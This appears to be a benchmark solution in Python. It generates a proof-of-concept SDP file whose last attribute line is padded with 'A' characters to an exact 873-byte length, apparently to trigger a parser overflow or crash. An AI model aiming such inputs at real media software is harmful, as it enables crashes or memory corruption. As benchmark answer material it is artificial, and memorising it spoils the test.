class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal SDP template
        lines = [
            "v=0",
            "o=- 0 0 IN IP4 127.0.0.1",
            "s=Test",
            "c=IN IP4 127.0.0.1",
            "t=0 0",
            "m=video 0 RTP/AVP 96",
        ]
        
        # Current length with newlines (LF)
        current_len = sum(len(line) + 1 for line in lines)
        target_len = 873
        # Last line: a=<value>\n
        value_len = target_len - current_len - 3  # "a=" + "\n" = 3
        value = "A" * value_len
        lines.append(f"a={value}")
        
        poc = "\n".join(lines) + "\n"
        # Ensure exact length
        assert len(poc) == target_len, f"Generated length {len(poc)}, expected {target_len}"
        return poc.encode()